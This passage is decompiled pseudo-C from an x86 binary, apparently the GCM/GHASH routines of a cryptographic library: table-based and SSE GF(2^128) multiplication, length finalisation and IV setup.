  int v204; // [esp+8Ch] [ebp-4h]
  int v205; // [esp+8Ch] [ebp-4h]
  unsigned int v206; // [esp+8Ch] [ebp-4h]
  __int16 vars0[2]; // [esp+90h] [ebp+0h]
  unsigned int v208; // [esp+98h] [ebp+8h]
  int v209; // [esp+98h] [ebp+8h]
  unsigned int v210; // [esp+98h] [ebp+8h]
  unsigned int v211; // [esp+98h] [ebp+8h]
  int v212; // [esp+98h] [ebp+8h]
  int v213; // [esp+9Ch] [ebp+Ch]
  unsigned int v214; // [esp+9Ch] [ebp+Ch]
  int v215; // [esp+9Ch] [ebp+Ch]
  int v216; // [esp+9Ch] [ebp+Ch]
  unsigned int v217; // [esp+9Ch] [ebp+Ch]
  int v218; // [esp+9Ch] [ebp+Ch]

  v3 = byte_4F0124;
  if ( !byte_4F0124 )
  {
    sub_466590();
    v3 = byte_4F0124;
  }
  v5 = (__m128i *)this[6];
  v141 = (__int32 *)v5;
  v6 = v5 + 1;
  if ( byte_4F012C )
    return sub_468340(a2, a3, v5 + 3, v5 + 1);
  v8 = this[5];
  v170 = v5 + 1;
  if ( !v3 )
    sub_466590();
  switch ( (v8 < 0x10000 ? 0 : 2) + (unsigned __int8)byte_4F0125 )
  {
    case 0:
      v9 = v6->m128i_i32[0];
      v10 = this[6] + 48;
      v11 = v6->m128i_i32[2];
      v12 = v6->m128i_i32[3];
      v191 = v10;
      v149 = v10 + 1792;
      v152 = v10 + 1280;
      v150 = v10 + 1536;
      v143 = v10 + 1024;
      v140 = v10 + 512;
      v142 = v10 + 768;
      v171 = v10 + 1800;
      v155 = v10 + 1288;
      v153 = v10 + 1544;
      v161 = v10 + 264;
      v13 = v6->m128i_i32[1];
      v157 = v10 + 1032;
      v159 = v10 + 776;
      v163 = v10 + 520;
      v14 = a3;
      v165 = v10 + 8;
      v15 = (__int32 *)a2;
      do
      {
        v16 = *v15 ^ v9;
        v144 = v15 + 4;
        v169 = v15[2] ^ v11;
        v176 = v15[3] ^ v12;
        v173 = HIBYTE(v176) & 0xF0;
        v203 = v15[1] ^ v13;
        v195 = HIBYTE(v16) & 0xF0;
        v182 = v16;
        v198 = HIBYTE(v169) & 0xF0;
        v167 = HIBYTE(v203) & 0xF0;
        v146 = v14 - 16;
        v17 = (v16 >> 20) & 0xF0;
        v18 = (v203 >> 20) & 0xF0;
        v192 = (v169 >> 20) & 0xF0;
        v19 = (v176 >> 20) & 0xF0;
        v174 = *(_DWORD *)(v149 + v173) ^ *(_DWORD *)(v150 + v198) ^ *(_DWORD *)(v152 + v167) ^ *(_DWORD *)(v143 + v195) ^ *(_DWORD *)(v142 + v19) ^ *(_DWORD *)(v140 + v192) ^ *(_DWORD *)(v191 + 256 + v18) ^ *(_DWORD *)(v17 + v191);
        v208 = *(_DWORD *)(v149 + v173 + 4) ^ *(_DWORD *)(v150 + v198 + 4) ^ *(_DWORD *)(v152 + v167 + 4) ^ *(_DWORD *)(v143 + v195 + 4) ^ *(_DWORD *)(v142 + v19 + 4) ^ *(_DWORD *)(v140 + v192 + 4) ^ *(_DWORD *)(v191 + 256 + v18 + 4) ^ *(_DWORD *)(v17 + v191 + 4);
        v177 = (v169 >> 12) & 0xF0;
        v188 = *(_DWORD *)(v171 + v173) ^ *(_DWORD *)(v153 + v198) ^ *(_DWORD *)(v155 + v167) ^ *(_DWORD *)(v157 + v195) ^ *(_DWORD *)(v159 + v19) ^ *(_DWORD *)(v163 + v192) ^ *(_DWORD *)(v161 + v18) ^ *(_DWORD *)(v165 + v17);
        v148 = *(_DWORD *)(v171 + v173 + 4) ^ *(_DWORD *)(v153 + v198 + 4) ^ *(_DWORD *)(v155 + v167 + 4) ^ *(_DWORD *)(v157 + v195 + 4) ^ *(_DWORD *)(v159 + v19 + 4) ^ *(_DWORD *)(v163 + v192 + 4) ^ *(_DWORD *)(v161 + v18 + 4) ^ *(_DWORD *)(v165 + v17 + 4);
        v20 = (v182 >> 12) & 0xF0;
        v21 = (v203 >> 12) & 0xF0;
        v22 = (v176 >> 12) & 0xF0;
        v23 = HIWORD(v182) & 0xF0;
        v213 = *(_DWORD *)(v23 + v143 + 4) ^ *(_DWORD *)(v22 + v142 + 4) ^ *(_DWORD *)(v177 + v140 + 4) ^ *(_DWORD *)(v21 + v191 + 256 + 4) ^ *(_DWORD *)(v20 + v191 + 4);
        v24 = HIWORD(v203) & 0xF0;
        v25 = *(_DWORD *)(v24 + v152) ^ *(_DWORD *)(v23 + v143) ^ *(_DWORD *)(v22 + v142) ^ *(_DWORD *)(v177 + v140) ^ *(_DWORD *)(v21 + v191 + 256) ^ *(_DWORD *)(v20 + v191);
        v26 = *(_DWORD *)(v24 + v152 + 4) ^ v213;
        v27 = HIWORD(v169) & 0xF0;
        v28 = *(_DWORD *)(v27 + v150) ^ v25;
        v29 = *(_DWORD *)(v27 + v150 + 4) ^ v26;
        v30 = HIWORD(v176) & 0xF0;
        v199 = *(_DWORD *)(v30 + v149) ^ v28;
        v31 = *(_DWORD *)(v30 + v149 + 4) ^ v29;
        v32 = (v176 >> 12) & 0xF0;
        v214 = (__PAIR64__(v208, v174) >> 24) ^ v31;
        v200 = (v174 << 8) ^ v199;
        v33 = *(_DWORD *)(v21 + v161 + 4) ^ *(_DWORD *)(v20 + v165 + 4);
        v34 = *(_DWORD *)(v21 + v161) ^ *(_DWORD *)(v20 + v165);
        v35 = HIWORD(v182) & 0xF0;
        v36 = *(_DWORD *)(v35 + v157 + 4) ^ *(_DWORD *)(v32 + v159 + 4) ^ *(_DWORD *)(v177 + v163 + 4) ^ v33;
        v37 = HIWORD(v203) & 0xF0;
        v38 = *(_DWORD *)(v37 + v155) ^ *(_DWORD *)(v35 + v157) ^ *(_DWORD *)(v32 + v159) ^ *(_DWORD *)(v177 + v163) ^ v34;
        v39 = *(_DWORD *)(v37 + v155 + 4) ^ v36;
        v40 = HIWORD(v169) & 0xF0;
        v41 = *(_DWORD *)(v40 + v153) ^ v38;
        v42 = *(_DWORD *)(v40 + v153 + 4) ^ v39;
        v43 = HIWORD(v176) & 0xF0;
        v168 = (v188 << 8) ^ HIBYTE(v208) ^ *(_DWORD *)(v43 + v171) ^ v41;
        v175 = (__PAIR64__(v148, v188) >> 24) ^ *(_DWORD *)(v43 + v171 + 4) ^ v42;
        v44 = (_DWORD *)(v191 + ((v176 >> 4) & 0xF0));
        v178 = (_DWORD *)(v191 + ((v203 >> 8) & 0xF0));
        v45 = (_DWORD *)(v191 + ((v169 >> 4) & 0xF0));
        v46 = (_DWORD *)(v191 + ((v203 >> 4) & 0xF0));
        v47 = v191 + ((v176 >> 8) & 0xF0);
        v48 = v178[320] ^ *(_DWORD *)(v47 + 1792);
        v209 = v178[321] ^ *(_DWORD *)(v47 + 1796);
        v49 = v191 + ((v169 >> 8) & 0xF0);
        v50 = *(_DWORD *)(v49 + 1536) ^ v48;
        v51 = *(_DWORD *)(v49 + 1540) ^ v209;
        v52 = v191 + ((v182 >> 8) & 0xF0);
        v189 = *(_DWORD *)(v52 + 1024) ^ v50;
        v53 = (_DWORD *)(((v182 >> 4) & 0xF0) + v191);
        v190 = *v53 ^ (v200 << 8) ^ v46[64] ^ v45[128] ^ v44[192] ^ v189;
        v210 = v53[1] ^ (__PAIR64__(v214, v200) >> 24) ^ v46[65] ^ v45[129] ^ v44[193] ^ *(_DWORD *)(v52 + 1028) ^ v51;
        v54 = v191 + ((v176 >> 8) & 0xF0);
        v201 = v178[322] ^ *(_DWORD *)(v54 + 1800);
        v55 = *(_DWORD *)(v54 + 1804);
        v56 = v191 + ((v169 >> 8) & 0xF0);
        v57 = *(_DWORD *)(v56 + 1544) ^ v201;
        v58 = *(_DWORD *)(v56 + 1548) ^ v178[323] ^ v55;
        v59 = v191 + ((v182 >> 8) & 0xF0);
        v196 = v46[67] ^ v45[131] ^ v44[195] ^ *(_DWORD *)(v59 + 1036) ^ v58;
        v60 = ((v182 >> 4) & 0xF0) + v191;
        v186 = v203 & 0xF;
        v202 = (v168 << 8) ^ HIBYTE(v214) ^ *(_DWORD *)(v60 + 8) ^ v46[66] ^ v45[130] ^ v44[194] ^ *(_DWORD *)(v59 + 1032) ^ v57;
        v197 = (__PAIR64__(v175, v168) >> 24) ^ *(_DWORD *)(v60 + 12) ^ v196;
        v61 = v176 & 0xF;
        v184 = v169 & 0xF;
        v179 = (_DWORD *)(v191 + 16 * (v182 & 0xF));
        v204 = v203 & 0xF0;
        v62 = (_DWORD *)((v169 & 0xF0) + v191);
        v193 = (_DWORD *)(v191 + (v176 & 0xF0));
        v183 = v182 & 0xF0;
        v63 = *(_DWORD *)(v183 + v191 + 1028) ^ *(_DWORD *)(v204 + v191 + 1284) ^ v62[385] ^ v193[449] ^ *(_DWORD *)(v191 + 16 * (v61 + 48) + 4) ^ *(_DWORD *)(v191 + 16 * (v184 + 32) + 4) ^ *(_DWORD *)(v191 + 16 * (v186 + 16) + 4);
        v215 = *(_DWORD *)(v183 + v191 + 1024) ^ *(_DWORD *)(v204 + v191 + 1280) ^ v62[384] ^ v193[448] ^ *(_DWORD *)(v191 + 16 * (v61 + 48)) ^ *(_DWORD *)(v191 + 16 * (v184 + 32)) ^ *(_DWORD *)(v191 + 16 * (v186 + 16));
        v61 *= 2;
        v64 = v179;
        v216 = *v179 ^ (v190 << 8) ^ v215;
        v180 = v179[1] ^ (__PAIR64__(v210, v190) >> 24) ^ v63;
        v65 = v64[2] ^ *(_DWORD *)(v183 + v191 + 1032) ^ *(_DWORD *)(v204 + v191 + 1288) ^ v62[386] ^ v193[450] ^ *(_DWORD *)(v191 + 16 * v186 + 264) ^ *(_DWORD *)(v191 + 16 * v184 + 520) ^ *(_DWORD *)(v191 + 8 * v61 + 776);
        v12 = (__PAIR64__(v197, v202) >> 24) ^ v64[3] ^ *(_DWORD *)(v183 + v191 + 1036) ^ *(_DWORD *)(v204 + v191 + 1292) ^ v62[387] ^ v193[451] ^ *(_DWORD *)(v191 + 16 * v186 + 268) ^ *(_DWORD *)(v191 + 16 * v184 + 524) ^ *(_DWORD *)(v191 + 8 * v61 + 780);
        v11 = (v202 << 8) ^ HIBYTE(v210) ^ v65;
        v9 = v216 ^ (unsigned __int16)word_4EFF08[HIBYTE(v197)] ^ (((unsigned __int16)word_4EFF08[HIBYTE(v175)] ^ ((unsigned __int16)word_4EFF08[HIBYTE(v148)] << 8)) << 8);
        v13 = v180 ^ ((((unsigned __int64)(unsigned __int16)word_4EFF08[HIBYTE(v148)] << 8) ^ (unsigned __int16)word_4EFF08[HIBYTE(v175)]) >> 24);
        v14 = v146;
        v15 = v144;
      }
      while ( v146 >= 0x10 );
      v141[4] = v9;
      v141[5] = v13;
      v141[6] = v11;
      v141[7] = v12;
      result = v146;
      break;
    case 1:
      v79 = a2;
      v80 = a3 >> 4;
      si128 = _mm_load_si128(v170);
      do
      {
        v82 = _mm_xor_si128(si128, _mm_loadu_si128(v79));
        v83 = _mm_cvtsi128_si32(v82);
        v84 = v83 & 0xF0F0F0F0;
        v85 = (16 * v83) & 0xF0F0F0F0;
        v86 = _mm_load_si128((__m128i *)((char *)v170 + BYTE1(v84) + 1056));
        v87 = _mm_load_si128((__m128i *)((char *)v170 + (unsigned __int8)v84 + 1056));
        v84 >>= 16;
        v88 = _mm_load_si128((__m128i *)((char *)v170 + BYTE1(v84) + 1056));
        v89 = _mm_load_si128((__m128i *)((char *)v170 + (unsigned __int8)v84 + 1056));
        v90 = _mm_srli_si128(v82, 4);
        v91 = _mm_cvtsi128_si32(v90) & 0xF0F0F0F0;
        v92 = _mm_xor_si128(v86, *(__m128i *)((char *)&v170[2] + BYTE1(v85)));
        v93 = _mm_xor_si128(v87, *(__m128i *)((char *)&v170[2] + (unsigned __int8)v85));
        v85 >>= 16;
        v94 = _mm_xor_si128(v88, *(__m128i *)((char *)&v170[2] + BYTE1(v85)));
        v95 = _mm_xor_si128(v89, *(__m128i *)((char *)&v170[2] + (unsigned __int8)v85));
        v96 = (16 * _mm_cvtsi128_si32(v90)) & 0xF0F0F0F0;
        v97 = _mm_xor_si128(v92, *(__m128i *)((char *)&v170[82] + BYTE1(v91)));
        v98 = _mm_xor_si128(v93, *(__m128i *)((char *)&v170[82] + (unsigned __int8)v91));
        v91 >>= 16;
        v99 = _mm_xor_si128(v94, *(__m128i *)((char *)&v170[82] + BYTE1(v91)));
        v100 = _mm_xor_si128(v95, *(__m128i *)((char *)&v170[82] + (unsigned __int8)v91));
        v101 = _mm_srli_si128(v90, 4);
        v102 = _mm_cvtsi128_si32(v101) & 0xF0F0F0F0;
        v103 = _mm_xor_si128(v97, *(__m128i *)((char *)&v170[18] + BYTE1(v96)));
        v104 = _mm_xor_si128(v98, *(__m128i *)((char *)&v170[18] + (unsigned __int8)v96));
        v96 >>= 16;
        v105 = _mm_xor_si128(v99, *(__m128i *)((char *)&v170[18] + BYTE1(v96)));
        v106 = _mm_xor_si128(v100, *(__m128i *)((char *)&v170[18] + (unsigned __int8)v96));
        v107 = (16 * _mm_cvtsi128_si32(v101)) & 0xF0F0F0F0;
        v108 = _mm_xor_si128(v103, *(__m128i *)((char *)&v170[98] + BYTE1(v102)));
        v109 = _mm_xor_si128(v104, *(__m128i *)((char *)&v170[98] + (unsigned __int8)v102));
        v102 >>= 16;
        v110 = _mm_xor_si128(v105, *(__m128i *)((char *)&v170[98] + BYTE1(v102)));
        v111 = _mm_xor_si128(v106, *(__m128i *)((char *)&v170[98] + (unsigned __int8)v102));
        v112 = _mm_srli_si128(v101, 4);
        v113 = _mm_cvtsi128_si32(v112) & 0xF0F0F0F0;
        v114 = _mm_xor_si128(v108, *(__m128i *)((char *)&v170[34] + BYTE1(v107)));
        v115 = _mm_xor_si128(v109, *(__m128i *)((char *)&v170[34] + (unsigned __int8)v107));
        v107 >>= 16;
        v116 = _mm_xor_si128(v110, *(__m128i *)((char *)&v170[34] + BYTE1(v107)));
        v117 = _mm_xor_si128(v111, *(__m128i *)((char *)&v170[34] + (unsigned __int8)v107));
        v118 = (16 * _mm_cvtsi128_si32(v112)) & 0xF0F0F0F0;
        v119 = _mm_xor_si128(v114, *(__m128i *)((char *)&v170[114] + BYTE1(v113)));
        v120 = _mm_xor_si128(v115, *(__m128i *)((char *)&v170[114] + (unsigned __int8)v113));
        v113 >>= 16;
        v121 = _mm_xor_si128(v119, *(__m128i *)((char *)&v170[50] + BYTE1(v118)));
        v122 = _mm_xor_si128(v120, *(__m128i *)((char *)&v170[50] + (unsigned __int8)v118));
        v118 >>= 16;
        v123 = _mm_xor_si128(
                 _mm_xor_si128(v116, *(__m128i *)((char *)&v170[114] + BYTE1(v113))),
                 *(__m128i *)((char *)&v170[50] + BYTE1(v118)));
        v124 = _mm_xor_si128(
                 _mm_xor_si128(
                   _mm_xor_si128(v117, *(__m128i *)((char *)&v170[114] + (unsigned __int8)v113)),
                   *(__m128i *)((char *)&v170[50] + (unsigned __int8)v118)),
                 _mm_slli_si128(v123, 1));
        v125 = (unsigned __int16)vars0[_mm_cvtsi128_si32(_mm_srli_si128(v123, 15))] << 8;
        v126 = _mm_xor_si128(v121, _mm_slli_si128(v124, 1));
        LOWORD(v125) = vars0[_mm_cvtsi128_si32(_mm_srli_si128(v124, 15))] ^ v125;
        v125 <<= 8;
        LOWORD(v125) = vars0[_mm_cvtsi128_si32(_mm_srli_si128(v126, 15))] ^ v125;
        si128 = _mm_xor_si128(_mm_cvtsi32_si128(v125), _mm_xor_si128(v122, _mm_slli_si128(v126, 1)));
        ++v79;
        --v80;
      }
      while ( v80 );
      *v170 = si128;
      result = a3 & 0xF;
      break;
    case 2:
      v66 = v6->m128i_i32[0];
      v67 = this[6] + 48;
      v68 = v6->m128i_i32[2];
      v69 = a3;
      v205 = v6->m128i_i32[1];
      v70 = v6->m128i_i32[3];
      v71 = (__int32 *)a2;
      while ( 1 )
      {
        v217 = *v71 ^ v66;
        v72 = v71[2] ^ v68;
        v73 = v71[3] ^ v70;
        v206 = v71[1] ^ v205;
        v162 = (v206 >> 20) & 0xFF0;
        v164 = (v217 >> 20) & 0xFF0;
        v151 = v69 - 16;
        v187 = (v73 >> 4) & 0xFF0;
        v74 = v73;
        v156 = (v72 >> 4) & 0xFF0;
        v194 = (v206 >> 12) & 0xFF0;
        v181 = (unsigned __int8)v73;
        v172 = (v217 >> 12) & 0xFF0;
        v75 = 2 * ((unsigned __int8)v73 + 3072);
        v145 = (unsigned __int8)v72;
        v211 = v72;
        v185 = (v206 >> 4) & 0xFF0;
        v154 = (v217 >> 4) & 0xFF0;
        v160 = (v74 >> 20) & 0xFF0;
        v76 = v72 >> 20;
        LOWORD(v72) = v74 >> 12;
        v158 = v76 & 0xFF0;
        v147 = (unsigned __int8)v206;
        v166 = (_DWORD *)(v67 + 16 * (unsigned __int8)v217);
        v77 = (v211 >> 12) & 0xFF0;
        v218 = *v166 ^ *(_DWORD *)(v160 + v67 + 61440) ^ *(_DWORD *)(v158 + v67 + 45056) ^ *(_DWORD *)(v67 + v162 + 28672) ^ *(_DWORD *)(v67 + v164 + 12288) ^ *(_DWORD *)(v67 + v187 + 53248) ^ *(_DWORD *)(v67 + v156 + 36864) ^ *(_DWORD *)(v67 + v194 + 24576) ^ *(_DWORD *)(v67 + v172 + 0x2000) ^ *(_DWORD *)(v185 + v67 + 20480) ^ *(_DWORD *)(v154 + v67 + 4096) ^ *(_DWORD *)((v72 & 0xFF0) + v67 + 57344) ^ *(_DWORD *)(v77 + v67 + 40960) ^ *(_DWORD *)(v67 + 16 * (v145 + 2048)) ^ *(_DWORD *)(v67 + 16 * ((unsigned __int8)v206 + 1024)) ^ *(_DWORD *)(v67 + 8 * v75);
        v205 = v166[1] ^ *(_DWORD *)(v160 + v67 + 61444) ^ *(_DWORD *)(v158 + v67 + 45060) ^ *(_DWORD *)(v67 + v162 + 28676) ^ *(_DWORD *)(v67 + v164 + 12292) ^ *(_DWORD *)(v67 + v187 + 53252) ^ *(_DWORD *)(v67 + v156 + 36868) ^ *(_DWORD *)(v67 + v194 + 24580) ^ *(_DWORD *)(v67 + v172 + 8196) ^ *(_DWORD *)(v185 + v67 + 20484) ^ *(_DWORD *)(v154 + v67 + 4100) ^ *(_DWORD *)((v72 & 0xFF0) + v67 + 57348) ^ *(_DWORD *)(v77 + v67 + 40964) ^ *(_DWORD *)(v67 + 16 * (v145 + 2048) + 4) ^ *(_DWORD *)(v67 + 16 * ((unsigned __int8)v206 + 1024) + 4) ^ *(_DWORD *)(v67 + 8 * v75 + 4);
        v78 = *(_DWORD *)((v72 & 0xFF0) + v67 + 57356) ^ *(_DWORD *)(v77 + v67 + 40972) ^ *(_DWORD *)(v67 + 16 * v181 + 49164) ^ *(_DWORD *)(v67 + 16 * v145 + 32780) ^ *(_DWORD *)(v67 + 16 * v147 + 16396);
        v212 = *(_DWORD *)((v72 & 0xFF0) + v67 + 57352) ^ *(_DWORD *)(v77 + v67 + 40968) ^ *(_DWORD *)(v67 + 16 * v181 + 49160) ^ *(_DWORD *)(v67 + 16 * v145 + 32776) ^ *(_DWORD *)(v67 + 16 * v147 + 16392);
        v69 = v151;
        v71 += 4;
        v68 = v166[2] ^ *(_DWORD *)(v162 + v67 + 28680) ^ *(_DWORD *)(v164 + v67 + 12296) ^ *(_DWORD *)(v160 + v67 + 61448) ^ *(_DWORD *)(v158 + v67 + 45064) ^ *(_DWORD *)(v187 + v67 + 53256) ^ *(_DWORD *)(v156 + v67 + 36872) ^ *(_DWORD *)(v185 + v67 + 20488) ^ *(_DWORD *)(v154 + v67 + 4104) ^ *(_DWORD *)(v194 + v67 + 24584) ^ *(_DWORD *)(v172 + v67 + 8200) ^ v212;
        v70 = v166[3] ^ *(_DWORD *)(v162 + v67 + 28684) ^ *(_DWORD *)(v164 + v67 + 12300) ^ *(_DWORD *)(v160 + v67 + 61452) ^ *(_DWORD *)(v158 + v67 + 45068) ^ *(_DWORD *)(v187 + v67 + 53260) ^ *(_DWORD *)(v156 + v67 + 36876) ^ *(_DWORD *)(v185 + v67 + 20492) ^ *(_DWORD *)(v154 + v67 + 4108) ^ *(_DWORD *)(v194 + v67 + 24588) ^ *(_DWORD *)(v172 + v67 + 8204) ^ v78;
        if ( v151 < 0x10 )
          break;
        v66 = v218;
      }
      v141[4] = v218;
      v141[5] = v205;
      result = v151;
      v141[6] = v68;
      v141[7] = v70;
      break;
    case 3:
      v127 = a2;
      v128 = a3 >> 4;
      v129 = _mm_load_si128(v170);
      do
      {
        v130 = _mm_xor_si128(_mm_loadu_si128(v127), v129);
        v131 = _mm_cvtsi128_si32(v130);
        v132 = _mm_srli_si128(v130, 4);
        v133 = _mm_xor_si128(
                 _mm_xor_si128(
                   _mm_xor_si128(_mm_xor_si128((__m128i)0i64, v170[(unsigned __int8)v131 + 2]), v170[BYTE1(v131) + 258]),
                   v170[BYTE2(v131) + 514]),
                 v170[HIBYTE(v131) + 770]);
        v134 = _mm_cvtsi128_si32(v132);
        v135 = _mm_srli_si128(v132, 4);
        v136 = _mm_xor_si128(
                 _mm_xor_si128(
                   _mm_xor_si128(_mm_xor_si128(v133, v170[(unsigned __int8)v134 + 1026]), v170[BYTE1(v134) + 1282]),
                   v170[BYTE2(v134) + 1538]),
                 v170[HIBYTE(v134) + 1794]);
        v137 = _mm_cvtsi128_si32(v135);
        v138 = _mm_xor_si128(
                 _mm_xor_si128(
                   _mm_xor_si128(_mm_xor_si128(v136, v170[(unsigned __int8)v137 + 2050]), v170[BYTE1(v137) + 2306]),
                   v170[BYTE2(v137) + 2562]),
                 v170[HIBYTE(v137) + 2818]);
        v139 = _mm_cvtsi128_si32(_mm_srli_si128(v135, 4));
        v129 = _mm_xor_si128(
                 _mm_xor_si128(
                   _mm_xor_si128(_mm_xor_si128(v138, v170[(unsigned __int8)v139 + 3074]), v170[BYTE1(v139) + 3330]),
                   v170[BYTE2(v139) + 3586]),
                 v170[HIBYTE(v139) + 3842]);
        ++v127;
        --v128;
      }
      while ( v128 );
      *v170 = v129;
      goto LABEL_21;
    default:
LABEL_21:
      result = a3 & 0xF;
      break;
  }
  return result;
}
// 4EFF08: using guessed type __int16 word_4EFF08[];
// 4F0124: using guessed type char byte_4F0124;
// 4F0125: using guessed type char byte_4F0125;
// 4F012C: using guessed type char byte_4F012C;

//----- (004610C0) --------------------------------------------------------
int __thiscall sub_4610C0(int this)
{
  int v2; // ecx
  _DWORD *v3; // edx
  unsigned int v4; // eax
  unsigned __int32 v5; // eax

  v2 = *(_DWORD *)(this + 56);
  if ( v2 )
  {
    memset((void *)(v2 + *(_DWORD *)(this + 24)), 0, 16 - v2);
    *(_DWORD *)(this + 56) = 0;
    sub_460150((_DWORD *)this, *(__m128i **)(this + 24), 0x10u);
  }
  v3 = *(_DWORD **)(this + 24);
  v4 = *(_QWORD *)(this + 32) >> 29;
  v3[1] = _byteswap_ulong(8 * *(_DWORD *)(this + 32));
  *v3 = _byteswap_ulong(v4);
  v5 = _byteswap_ulong(*(_QWORD *)(this + 40) >> 29);
  v3[3] = _byteswap_ulong(8 * *(_DWORD *)(this + 40));
  v3[2] = v5;
  return sub_460150((_DWORD *)this, *(__m128i **)(this + 24), 0x10u);
}

//----- (00461140) --------------------------------------------------------
int __thiscall sub_461140(_DWORD *this, int a2, int a3)
{
  (*(void (__thiscall **)(_DWORD *, _DWORD, _DWORD))(this[17] + 52))(this + 17, 0, 0);
  if ( !byte_4F0124 )
    sub_466590();
  if ( byte_4F012C )
    sub_4685C0((__m128i *)(this[6] + 16));
  return (*(int (__thiscall **)(_DWORD *, int, int, int))(this[17] + 32))(this + 17, a2, this[6] + 16, a3);
}
// 4F0124: using guessed type char byte_4F0124;
// 4F012C: using guessed type char byte_4F012C;

//----- (004611A0) --------------------------------------------------------
int __thiscall sub_4611A0(int this)
{
  int v2; // ecx
  int result; // eax

  v2 = *(_DWORD *)(this + 56);
  if ( v2 )
  {
    memset((void *)(v2 + *(_DWORD *)(this + 24)), 0, 16 - v2);
    *(_DWORD *)(this + 56) = 0;
    return sub_460150((_DWORD *)this, *(__m128i **)(this + 24), 0x10u);
  }
  return result;
}

//----- (004611E0) --------------------------------------------------------
int __thiscall sub_4611E0(_DWORD *this)
{
  int result; // eax
  int v2; // edx
  int i; // ecx
  bool v4; // zf

  result = 1;
  v2 = this[5] + this[11];
  for ( i = 2; i >= 0; --i )
  {
    if ( !result )
      break;
    v4 = (*(_BYTE *)(i + v2 - 4))++ == 0xFF;
    result = v4;
  }
  return result;
}

//----- (00461210) --------------------------------------------------------
int __thiscall sub_461210(_DWORD *this)
{
  int v3; // eax

  if ( !byte_4F0124 )
    sub_466590();
  if ( byte_4F0125 )
    return 16;
  v3 = (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 124))(this - 1);
  return (*(int (__thiscall **)(int))(*(_DWORD *)(v3 + 4) + 24))(v3 + 4);
}
// 4F0124: using guessed type char byte_4F0124;
// 4F0125: using guessed type char byte_4F0125;

//----- (00461250) --------------------------------------------------------
int __thiscall sub_461250(_DWORD *this, __m128i *Src, size_t Size)
{
  __m128i *v3; // ebp
  int v5; // eax
  int v6; // ebx
  int v7; // edi
  _DWORD *v8; // edx
  int result; // eax
  int v10; // [esp+10h] [ebp-4h]

  v3 = Src;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 124))(this);
  v6 = Size;
  v7 = this[6] + 16;
  v10 = v5;
  if ( Size == 12 )
  {
    *(_QWORD *)v7 = Src->m128i_i64[0];
    *(_DWORD *)(v7 + 8) = Src->m128i_i32[2];
    *(_DWORD *)(v7 + 12) = 0x1000000;
  }
  else
  {
    *(_OWORD *)v7 = 0i64;
    if ( Size >= 0x10 )
    {
      v6 = sub_460150(this, Src, Size);
      v3 = (__m128i *)((char *)Src + Size - v6);
    }
    if ( v6 )
    {
      memmove((void *)this[6], v3, v6);
      memset((void *)(v6 + this[6]), 0, 16 - v6);
      sub_460150(this, (__m128i *)this[6], 0x10u);
    }
    v8 = (_DWORD *)this[6];
    *v8 = _byteswap_ulong(0);
    v8[1] = _byteswap_ulong(0);
    v8[3] = _byteswap_ulong(8 * Size);
    v8[2] = _byteswap_ulong(0);
    sub_460150(this, (__m128i *)this[6], 0x10u);
    if ( !byte_4F0124 )
      sub_466590();
    if ( byte_4F012C )
      sub_4685C0((__m128i *)(this[6] + 16));
  }
  if ( (int)this[15] < 2 )
  {
    sub_438610(this + 16, v7);
    this[18] = v10;
    (*(void (__thiscall **)(_DWORD *))(this[16] + 64))(this + 16);
    (*(void (__thiscall **)(_DWORD *, _DWORD))(this[16] + 60))(this + 16, 0);
    if ( (*(int (__thiscall **)(_DWORD *))(this[16] + 28))(this + 16) < 4 )
      (*(void (__stdcall **)(int, int))(this[16] + 44))(v7, -1);
  }
  else
  {
    (*(void (__stdcall **)(int, int))(this[16] + 44))(v7, 16);
  }
  result = (*(int (__thiscall **)(_DWORD *, int, _DWORD))(this[17] + 52))(this + 17, 16, 0);
  *(_OWORD *)v7 = 0i64;
  return result;
}
// 4F0124: using guessed type char byte_4F0124;
// 4F012C: using guessed type char byte_4F012C;

//----- (004613A0) --------------------------------------------------------
signed int __fastcall sub_4613A0(int a1, int a2, int a3, int a4, unsigned int a5)
{
  _DWORD *v5; // esi
  int v6; // eax
  _DWORD *v7; // edi
  int v8; // eax
  _DWORD *v9; // ecx
  int v10; // esi
  unsigned __int8 (__stdcall *v11)(const char *, int *, int *); // eax
  int v12; // eax
  int v13; // edi
  _DWORD *v14; // eax
  unsigned int v15; // edi
  unsigned int v16; // edx
  void *v17; // esi
  char *v18; // eax
  size_t v19; // ecx
  int *v20; // ecx
  __m128i *v21; // edi
  int v22; // esi
  int v23; // eax
  signed int result; // eax
  unsigned int v25; // edi
  unsigned __int32 v26; // eax
  int v27; // eax
  int v28; // edx
  unsigned int v29; // esi
  _DWORD *v30; // edx
  unsigned int v31; // ecx
  unsigned __int32 v32; // eax
  int v33; // ecx
  int v34; // edx
  int v35; // edi
  int v36; // ecx
  __m128i *v37; // edx
  __m128i *v38; // edi
  __m128i *v39; // esi
  _DWORD *v40; // edi
  int *v41; // esi
  _DWORD *v42; // edx
  int v43; // ecx
  int v44; // eax
  int v45; // ecx
  int v46; // eax
  bool v47; // zf
  int v48; // edi
  unsigned int v49; // edx
  unsigned int v50; // esi
  __int16 v51; // cx
  unsigned int v52; // ecx
  unsigned int v53; // edi
  char *v54; // edx
  unsigned int v55; // esi
  __int16 v56; // ax
  unsigned int v57; // eax
  char v58; // cl
  unsigned int v59; // eax
  _DWORD *v60; // edx
  unsigned int v61; // ecx
  unsigned __int32 v62; // eax
  char v63; // dl
  int v64; // edx
  int v65; // edi
  signed int v66; // edx
  int v67; // edx
  __m128i *v68; // eax
  __m128i *v69; // esi
  __m128i *v70; // edi
  int v71; // ecx
  _DWORD *v72; // edi
  _DWORD *v73; // esi
  int v74; // edx
  int v75; // ecx
  int v76; // edx
  int v77; // ecx
  _DWORD *v78; // edi
  int v79; // ecx
  int v80; // edx
  int v81; // ecx
  char *v82; // eax
  _DWORD *v83; // eax
  int v84; // [esp+18h] [ebp-8Ch]
  __m128i *v85; // [esp+18h] [ebp-8Ch]
  unsigned int v86; // [esp+1Ch] [ebp-88h]
  __m128i *v87; // [esp+1Ch] [ebp-88h]
  _DWORD *v88; // [esp+1Ch] [ebp-88h]
  int v89; // [esp+20h] [ebp-84h] BYREF
  char *v90; // [esp+24h] [ebp-80h]
  int v91; // [esp+28h] [ebp-7Ch]
  __int64 v92; // [esp+2Ch] [ebp-78h]
  unsigned int v93; // [esp+34h] [ebp-70h]
  unsigned int v94; // [esp+38h] [ebp-6Ch]
  char v95[24]; // [esp+3Ch] [ebp-68h] BYREF
  char v96[24]; // [esp+54h] [ebp-50h] BYREF
